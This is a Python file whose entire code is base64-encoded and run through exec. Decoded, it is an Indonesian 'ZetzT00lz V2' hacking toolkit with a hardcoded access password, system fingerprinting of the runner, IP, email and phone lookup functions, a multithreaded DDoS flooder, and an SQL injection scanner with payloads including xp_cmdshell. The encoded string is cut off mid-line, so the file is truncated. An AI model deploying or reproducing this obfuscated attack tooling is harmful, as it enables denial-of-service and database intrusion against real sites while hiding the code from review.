# Encrypted Python Code
import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQoiIiIKWmV0elQwMGx6IFYyIC0gQWR2YW5jZWQgUGVudGVzdGluZyBUb29sa2l0CkNyZWF0ZWQgYnk6IERlZW1aZXQKVmVyc2lvbjogMi4wCiIiIgoKaW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHNvY2tldAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGpzb24KaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgdXJsbGliLnBhcnNlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmZyb20gY29sb3JhbWEgaW1wb3J0IGluaXQsIEZvcmUsIFN0eWxlCgojIEluaXRpYWxpemUgY29sb3JhbWEKaW5pdChhdXRvcmVzZXQ9VHJ1ZSkKCiMgUGFzc3dvcmQgdW50dWsgYWtzZXMKQUNDRVNTX1BBU1NXT1JEID0gIkRpbXpHYW50ZW5nIgoKIyBBU0NJSSBBcnQgZGVuZ2FuIHdhcm5hCkFTQ0lJX0FSVCA9IGYiIiIKe0ZvcmUuQ1lBTn0gX19fX18gICAgXyAgICAgICAgIF9fX19fICAgICAgICAgICBfICAgICAgX18gICAgIF9fX19fXyAgCntGb3JlLkNZQU59fF9fICAvX19ffCB8XyBfX19fIHxfICAgX3xfXyAgIF9fXyB8IHxfX19fIFxcIFxcICAgLyAvX19fIFxcIAp7Rm9yZS5DWUFOfSAgLyAvLyBfIFxcIF9ffF8gIC8gICB8IHwvIF8gXFwgLyBfIFxcfCB8XyAgLyAgXFwgXFwgLyAvICBfXykgfAp7Rm9yZS5DWUFOfSAvIC98ICBfXy8gfF8gLyAvICAgIHwgfCAoXykgfCAoXykgfCB8LyAvICAgIFxcIFYgLyAgLyBfXy8gCntGb3JlLkNZQU59L19fX19cXF9fX3xcXF9fL19fX3wgICB8X3xcXF9fXy8gXFxfX18vfF8vX19ffCAgICBcXF8vICB8X19fX198CntGb3JlLllFTExPV30gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2Mi4wCiIiIgoKY2xhc3MgWmV0elQwMGx6VjI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5ydW5uaW5nID0gVHJ1ZQogICAgICAgIHNlbGYuc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgIHNlbGYudXNlcl9hZ2VudHMgPSBbCiAgICAgICAgICAgICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYnLAogICAgICAgICAgICAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwKSBBcHBsZVdlYktpdC81MzcuMzYnLAogICAgICAgICAgICAnTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxNF8wIGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1JwogICAgICAgIF0KICAgICAgICBzZWxmLmdldF9zeXN0ZW1faW5mbygpCiAgICAgICAgCiAgICBkZWYgZ2V0X3N5c3RlbV9pbmZvKHNlbGYpOgogICAgICAgICIiIk1lbmRhcGF0a2FuIGluZm9ybWFzaSBzaXN0ZW0gdXNlciIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgIyBJUCBQdWJsaWMKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2VsZi5wdWJsaWNfaXAgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycpLnRleHQKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgc2VsZi5wdWJsaWNfaXAgPSAiVGlkYWsgdGVyZGV0ZWtzaSIKICAgICAgICAgICAgCiAgICAgICAgICAgICMgT1MgSW5mbwogICAgICAgICAgICBzZWxmLm9zX25hbWUgPSBvcy5uYW1lCiAgICAgICAgICAgIGlmIG9zLm5hbWUgPT0gJ3Bvc2l4JzoKICAgICAgICAgICAgICAgIHNlbGYub3NfZGV0YWlsID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ3VuYW1lIC1hJykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYub3NfZGV0YWlsID0gc3lzLnBsYXRmb3JtCiAgICAgICAgICAgIAogICAgICAgICAgICAjIERldmljZS9Vc2VybmFtZQogICAgICAgICAgICBzZWxmLnVzZXJuYW1lID0gb3MuZ2V0bG9naW4oKSBpZiBoYXNhdHRyKG9zLCAnZ2V0bG9naW4nKSBlbHNlIG9zLmVudmlyb24uZ2V0KCdVU0VSJywgJ1Vua25vd24nKQogICAgICAgICAgICAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHNlbGYucHVibGljX2lwID0gIkVycm9yIgogICAgICAgICAgICBzZWxmLm9zX2RldGFpbCA9ICJVbmtub3duIgogICAgICAgICAgICBzZWxmLnVzZXJuYW1lID0gIlVua25vd24iCiAgICAKICAgIGRlZiBjbGVhcl9zY3JlZW4oc2VsZik6CiAgICAgICAgIiIiTWVtYmVyc2loa2FuIGxheWFyIiIiCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicgaWYgb3MubmFtZSA9PSAncG9zaXgnIGVsc2UgJ2NscycpCiAgICAKICAgIGRlZiBwcmludF9iYW5uZXIoc2VsZik6CiAgICAgICAgIiIiTWVuYW1waWxrYW4gYmFubmVyIiIiCiAgICAgICAgc2VsZi5jbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KEFTQ0lJX0FSVCkKICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfeKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlyIpCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn3ilZEgICAgICAgICAgICAgICBTWVNURU0gSU5GT1JNQVRJT04gICAgICAgICAgICAgICAgICAgICAgICAg4pWRIikKICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfeKVoOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVoyIpCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5DWUFOfeKVkSBQdWJsaWMgSVAgICAgOiB7c2VsZi5wdWJsaWNfaXA6PDQzfSDilZEiKQogICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgT1MgICAgICAgICAgIDoge3NlbGYub3NfZGV0YWlsWzo0NV06PDQ1fSDilZEiKQogICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgVXNlciAgICAgICAgIDoge3NlbGYudXNlcm5hbWU6PDQzfSDilZEiKQogICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgVGltZSAgICAgICAgIDoge2RhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCclWS0lbS0lZCAlSDolTTolUycpOjw0M30g4pWRIikKICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfeKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnSIpCiAgICAgICAgcHJpbnQoKQogICAgCiAgICBkZWYgbG9naW4oc2VsZik6CiAgICAgICAgIiIiTG9naW4gZGVuZ2FuIHBhc3N3b3JkIiIiCiAgICAgICAgc2VsZi5wcmludF9iYW5uZXIoKQogICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBNYXN1a2thbiBwYXNzd29yZCB1bnR1ayBtZW5nYWtzZXMgWmV0elQwMGx6IFYyIikKICAgICAgICAKICAgICAgICBhdHRlbXB0cyA9IDMKICAgICAgICB3aGlsZSBhdHRlbXB0cyA+IDA6CiAgICAgICAgICAgIHBhc3N3b3JkID0gaW5wdXQoZiJ7Rm9yZS5XSElURX1bP10gUGFzc3dvcmQ6IHtGb3JlLlJFU0VUfSIpCiAgICAgICAgICAgIGlmIHBhc3N3b3JkID09IEFDQ0VTU19QQVNTV09SRDoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU59W+Kck10gQWtzZXMgZGliZXJpa2FuISBNZW11YXQgdG9vbHMuLi4iKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGF0dGVtcHRzIC09IDEKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuUkVEfVvinJddIFBhc3N3b3JkIHNhbGFoISBTaXNhIHBlcmNvYmFhbjoge2F0dGVtcHRzfSIpCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5SRUR9WyFdIEFrc2VzIGRpdG9sYWshIFByb2dyYW0gZGloZW50aWthbi4iKQogICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICBkZWYgb3NpbnRfaXBfdHJhY2tlcihzZWxmLCBpcF9hZGRyZXNzKToKICAgICAgICAiIiJNZWxhY2FrIGluZm9ybWFzaSBJUCIiIgogICAgICAgIHByaW50KGYiXG57Rm9yZS5DWUFOfVsqXSBNZWxhY2FrIElQOiB7aXBfYWRkcmVzc30iKQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgIyBNZW5nZ3VuYWthbiBpcGFwaS5jbwogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vaXBhcGkuY28ve2lwX2FkZHJlc3N9L2pzb24vJykKICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgJ2Vycm9yJyBub3QgaW4gZGF0YToKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU594pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXIikKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU594pWRICAgICAgICAgICAgICAgICAgICBJUCBUUkFDS0VSIFJFU1VMVFMgICAgICAgICAgICAgICAgICAgIOKVkSIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfeKVoOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVoyIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkNZQU594pWRIElQIEFkZHJlc3MgICAgOiB7ZGF0YS5nZXQoJ2lwJywgJ04vQScpOjw0M30g4pWRIikKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgQ2l0eSAgICAgICAgICA6IHtkYXRhLmdldCgnY2l0eScsICdOL0EnKTo8NDN9IOKVkSIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkNZQU594pWRIFJlZ2lvbiAgICAgICAgOiB7ZGF0YS5nZXQoJ3JlZ2lvbicsICdOL0EnKTo8NDN9IOKVkSIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkNZQU594pWRIENvdW50cnkgICAgICAgOiB7ZGF0YS5nZXQoJ2NvdW50cnlfbmFtZScsICdOL0EnKTo8NDN9IOKVkSIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkNZQU594pWRIElTUCAgICAgICAgICAgOiB7ZGF0YS5nZXQoJ29yZycsICdOL0EnKTo8NDN9IOKVkSIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkNZQU594pWRIExhdGl0dWRlICAgICAgOiB7ZGF0YS5nZXQoJ2xhdGl0dWRlJywgJ04vQScpOjw0M30g4pWRIikKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgTG9uZ2l0dWRlICAgICA6IHtkYXRhLmdldCgnbG9uZ2l0dWRlJywgJ04vQScpOjw0M30g4pWRIikKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgVGltZXpvbmUgICAgICA6IHtkYXRhLmdldCgndGltZXpvbmUnLCAnTi9BJyk6PDQzfSDilZEiKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn3ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0iKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIEdvb2dsZSBNYXBzIGxpbmsKICAgICAgICAgICAgICAgIGlmICdsYXRpdHVkZScgaW4gZGF0YSBhbmQgJ2xvbmdpdHVkZScgaW4gZGF0YToKICAgICAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLllFTExPV31bK10gR29vZ2xlIE1hcHM6IGh0dHBzOi8vbWFwcy5nb29nbGUuY29tLz9xPXtkYXRhWydsYXRpdHVkZSddfSx7ZGF0YVsnbG9uZ2l0dWRlJ119IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuUkVEfVvinJddIElQIHRpZGFrIHZhbGlkIGF0YXUgdGlkYWsgZGl0ZW11a2FuIikKICAgICAgICAgICAgICAgIAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5SRUR9W+Kcl10gRXJyb3I6IHtlfSIpCiAgICAKICAgIGRlZiBvc2ludF9lbWFpbF90cmFja2VyKHNlbGYsIGVtYWlsKToKICAgICAgICAiIiJNZWxhY2FrIGluZm9ybWFzaSBlbWFpbCIiIgogICAgICAgIHByaW50KGYiXG57Rm9yZS5DWUFOfVsqXSBNZWxhY2FrIEVtYWlsOiB7ZW1haWx9IikKICAgICAgICAKICAgICAgICAjIENlayBmb3JtYXQgZW1haWwKICAgICAgICBpZiBub3QgcmUubWF0Y2gociJbXkBdK0BbXkBdK1wuW15AXSsiLCBlbWFpbCk6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuUkVEfVvinJddIEZvcm1hdCBlbWFpbCB0aWRhayB2YWxpZCIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIAogICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBNZW1lcmlrc2Ega2Vib2NvcmFuIGRhdGEuLi4iKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAKICAgICAgICAjIFNpbXVsYXNpIHBlbWVyaWtzYWFuIChkYWxhbSByZWFsIGltcGxlbWVudGF0aW9uIGJpc2EgaW50ZWdyYXRlIGRlbmdhbiBBUEkpCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn1bK10gRW1haWwgdmFsaWQ6IHtlbWFpbH0iKQogICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBUaXBzOiBHdW5ha2FuIGhhdmVpYmVlbnB3bmVkLmNvbSB1bnR1ayBjZWsga2Vib2NvcmFuIGRhdGEiKQogICAgICAgIAogICAgICAgICMgRWtzdHJhayBkb21haW4gZW1haWwKICAgICAgICBkb21haW4gPSBlbWFpbC5zcGxpdCgnQCcpWzFdCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5DWUFOfVsqXSBEb21haW4gZW1haWw6IHtkb21haW59IikKICAgICAgICBwcmludChmIntGb3JlLllFTExPV31bIV0gTGFrdWthbiBXSE9JUyBsb29rdXAgdW50dWsgZG9tYWluIHRlcnNlYnV0IikKICAgIAogICAgZGVmIG9zaW50X3Bob25lX3RyYWNrZXIoc2VsZiwgcGhvbmUpOgogICAgICAgICIiIk1lbGFjYWsgaW5mb3JtYXNpIG5vbW9yIHRlbGVwb24iIiIKICAgICAgICBwcmludChmIlxue0ZvcmUuQ1lBTn1bKl0gTWVsYWNhayBOb21vcjoge3Bob25lfSIpCiAgICAgICAgCiAgICAgICAgIyBIYXB1cyBrYXJha3RlciBub24tZGlnaXQKICAgICAgICBjbGVhbl9waG9uZSA9IHJlLnN1YihyJ1xEJywgJycsIHBob25lKQogICAgICAgIAogICAgICAgIGlmIGxlbihjbGVhbl9waG9uZSkgPCA4OgogICAgICAgICAgICBwcmludChmIntGb3JlLlJFRH1b4pyXXSBOb21vciB0ZWxlcG9uIHRlcmxhbHUgcGVuZGVrIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5ZRUxMT1d9WyFdIE1lbmdhbmFsaXNpcyBmb3JtYXQgbm9tb3IuLi4iKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAKICAgICAgICAjIERldGVrc2kga29kZSBuZWdhcmEgKHNlZGVyaGFuYSkKICAgICAgICBpZiBjbGVhbl9waG9uZS5zdGFydHN3aXRoKCc2MicpOgogICAgICAgICAgICBjb3VudHJ5ID0gIkluZG9uZXNpYSIKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn1bK10gS29kZSBuZWdhcmEgdGVyZGV0ZWtzaTogSW5kb25lc2lhICgrNjIpIikKICAgICAgICBlbGlmIGNsZWFuX3Bob25lLnN0YXJ0c3dpdGgoJzEnKToKICAgICAgICAgICAgY291bnRyeSA9ICJVU0EvQ2FuYWRhIgogICAgICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfVsrXSBLb2RlIG5lZ2FyYSB0ZXJkZXRla3NpOiBVU0EvQ2FuYWRhICgrMSkiKQogICAgICAgIGVsaWYgY2xlYW5fcGhvbmUuc3RhcnRzd2l0aCgnNDQnKToKICAgICAgICAgICAgY291bnRyeSA9ICJVSyIKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn1bK10gS29kZSBuZWdhcmEgdGVyZGV0ZWtzaTogVUsgKCs0NCkiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGNvdW50cnkgPSAiVW5rbm93biIKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5ZRUxMT1d9WyFdIEtvZGUgbmVnYXJhIHRpZGFrIGRpa2VuYWxpIikKICAgICAgICAKICAgICAgICBwcmludChmIntGb3JlLllFTExPV31bIV0gQ2F0YXRhbjogUGVsYWNha2FuIGxlbmdrYXAgbWVtYnV0dWhrYW4gQVBJIGJlcmJheWFyIikKICAgIAogICAgZGVmIGRkb3NfYXR0YWNrKHNlbGYsIHRhcmdldCwgcG9ydD04MCwgdGhyZWFkcz0xMDAsIGR1cmF0aW9uPTMwKToKICAgICAgICAiIiJNZWxha3VrYW4gRERvUyBhdHRhY2sgKEVEVUNBVElPTkFMIFBVUlBPU0UgT05MWSkiIiIKICAgICAgICBwcmludChmIlxue0ZvcmUuUkVEfVshXSBQRVJJTkdBVEFOOiBERG9TIElMTEVHQUwgdGFucGEgaXppbiEiKQogICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBJbmkgaGFueWEgdW50dWsgZWR1a2FzaSBkYW4gdGVzdGluZyBzaXN0ZW0gc2VuZGlyaSIpCiAgICAgICAgCiAgICAgICAgY29uZmlybSA9IGlucHV0KGYie0ZvcmUuV0hJVEV9Wz9dIExhbmp1dGthbj8gKHkvbik6IHtGb3JlLlJFU0VUfSIpLmxvd2VyKCkKICAgICAgICBpZiBjb25maXJtICE9ICd5JzoKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiJcbntGb3JlLkNZQU59WypdIE1lbXVsYWkgRERvUyBhdHRhY2sga2Uge3RhcmdldH06e3BvcnR9IikKICAgICAgICBwcmludChmIntGb3JlLkNZQU59WypdIFRocmVhZHM6IHt0aHJlYWRzfSwgRHVyYXNpOiB7ZHVyYXRpb259IGRldGlrIikKICAgICAgICAKICAgICAgICBhdHRhY2tfY291bnQgPSAwCiAgICAgICAgc3RvcF9hdHRhY2sgPSBGYWxzZQogICAgICAgIAogICAgICAgIGRlZiBhdHRhY2tfdGhyZWFkKCk6CiAgICAgICAgICAgIG5vbmxvY2FsIGF0dGFja19jb3VudAogICAgICAgICAgICB3aGlsZSBub3Qgc3RvcF9hdHRhY2s6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgIyBNZW1idWF0IHNvY2tldCBjb25uZWN0aW9uCiAgICAgICAgICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgICAgICAgICBzb2NrLnNldHRpbWVvdXQoMSkKICAgICAgICAgICAgICAgICAgICBzb2NrLmNvbm5lY3QoKHRhcmdldCwgcG9ydCkpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgIyBNZW5naXJpbSBwYWNrZXQKICAgICAgICAgICAgICAgICAgICBzb2NrLnNlbmR0bygoIkdFVCAvIEhUVFAvMS4xXHJcbiIpLmVuY29kZSgnYXNjaWknKSwgKHRhcmdldCwgcG9ydCkpCiAgICAgICAgICAgICAgICAgICAgc29jay5zZW5kdG8oKCJIb3N0OiAiICsgdGFyZ2V0ICsgIlxyXG5cclxuIikuZW5jb2RlKCdhc2NpaScpLCAodGFyZ2V0LCBwb3J0KSkKICAgICAgICAgICAgICAgICAgICBzb2NrLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBhdHRhY2tfY291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgCiAgICAgICAgIyBTdGFydCB0aHJlYWRzCiAgICAgICAgdGhyZWFkX2xpc3QgPSBbXQogICAgICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQogICAgICAgIAogICAgICAgIGZvciBpIGluIHJhbmdlKHRocmVhZHMpOgogICAgICAgICAgICB0aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1hdHRhY2tfdGhyZWFkKQogICAgICAgICAgICB0aHJlYWQuZGFlbW9uID0gVHJ1ZQogICAgICAgICAgICB0aHJlYWQuc3RhcnQoKQogICAgICAgICAgICB0aHJlYWRfbGlzdC5hcHBlbmQodGhyZWFkKQogICAgICAgIAogICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBBdHRhY2sgYmVyamFsYW4uLi4gVGVrYW4gQ3RybCtDIHVudHVrIGJlcmhlbnRpIikKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdoaWxlIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA8IGR1cmF0aW9uOgogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5DWUFOfVsqXSBQYWNrZXRzIHRlcmtpcmltOiB7YXR0YWNrX2NvdW50fSIsIGVuZD0nXHInKQogICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICAgICAgcHJpbnQoZiJcbntGb3JlLllFTExPV31bIV0gQXR0YWNrIGRpaGVudGlrYW4gb2xlaCB1c2VyIikKICAgICAgICAKICAgICAgICBzdG9wX2F0dGFjayA9IFRydWUKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiJcbntGb3JlLkdSRUVOfVsrXSBBdHRhY2sgc2VsZXNhaSEiKQogICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU59WytdIFRvdGFsIHBhY2tldHMgdGVya2lyaW06IHthdHRhY2tfY291bnR9IikKICAgIAogICAgZGVmIHNxbF9pbmplY3Rpb25fc2Nhbm5lcihzZWxmLCB1cmwpOgogICAgICAgICIiIlNjYW5uZXIgU1FMIEluamVjdGlvbiBzZWRlcmhhbmEiIiIKICAgICAgICBwcmludChmIlxue0ZvcmUuQ1lBTn1bKl0gU2Nhbm5pbmcgU1FMIEluamVjdGlvbjoge3VybH0iKQogICAgICAgIAogICAgICAgICMgRGFmdGFyIHBheWxvYWQgU1FMIEluamVjdGlvbgogICAgICAgIHBheWxvYWRzID0gWwogICAgICAgICAgICAiJyIsCiAgICAgICAgICAgICInIE9SICcxJz0nMSIsCiAgICAgICAgICAgICInIE9SICcxJz0nMScgLS0iLAogICAgICAgICAgICAiJyBVTklPTiBTRUxFQ1QgTlVMTC0tIiwKICAgICAgICAgICAgIicgQU5EIDE9Q09OVkVSVChpbnQsIEBAdmVyc2lvbiktLSIsCiAgICAgICAgICAgICInIEVYRUMgeHBfY21kc2hlbGwoJ2RpcicpLS0iCiAgICAgICAgXQogICAgICAgIAogICAgICAgIHZ1bG5lcmFibGUgPSBGYWxzZQogICAgICAgIAogICAgICAgIGZvciBwYXlsb2FkIGluIHBheWxvYWRzOgogICAgICAgICAgICB0ZXN0X3VybCA9IGYie3VybH17cGF5bG9hZH0iCiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBUZXN0aW5nOiB7cGF5bG9hZFs6MjBdfS4uLiIpCiAgICAgICAgICAgIAogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBoZWFkZXJzID0geydVc2VyLUFnZW50JzogcmFuZG9tLmNob2ljZShzZWxmLnVzZXJfYWdlbnRzKX0KICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHRlc3RfdXJsLCBoZWFkZXJzPWhlYWRlcnMsIHRpbWVvdXQ9NSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgIyBEZXRla3NpIGVycm9yIFNRTAogICAgICAgICAgICAgICAgc3FsX2Vycm9ycyA9IFsKICAgICAgICAgICAgICAgICAgICAnc3FsIHN5bnRheCcsCiAgICAgICAgICAgICAgICAgICAgJ215c3FsX2ZldGNoJywKICAgICAgICAgICAgICAgICAgICAnbXlzcWxfbnVtX3Jvd3MnLAogICAgICAgICAgICAgICAgICAgICd5b3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIHNxbCcsCiAgICAgICAgICAgICAgICAgICAgJ3dhcm5pbmc6IG15c3FsJywKICAgICAgICAgICAgICAgICAgICAndW5jbG9zZWQgcXVvdGF0aW9uIG1hcmsnLAogICAgICAgICAgICAgICAgICAgICdzcWwgc2VydmVyJywKICAgICAgICAgICAgICAgICAgICAnb2RiYyBkcml2ZXInLAogICAgICAgICAgICAgICAgICAgICdwb3N0Z3Jlc3FsJwogICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb3IgZXJyb3IgaW4gc3FsX2Vycm9yczoKICAgICAgICAgICAgICAgICAgICBpZiBlcnJvciBpbiByZXNwb25zZS50ZXh0Lmxvd2VyKCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU59WytdIFZVTE5FUkFCTEUhIFBheWxvYWQ6IHtwYXlsb2FkfSIpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU59WytdIEVycm9yIGRpdGVtdWthbjoge2Vycm9yfSIpCiAgICAgICAgICAgICAgICAgICAgICAgIHZ1bG5lcmFibGUgPSBUcnVlCiAgICAgICAgICA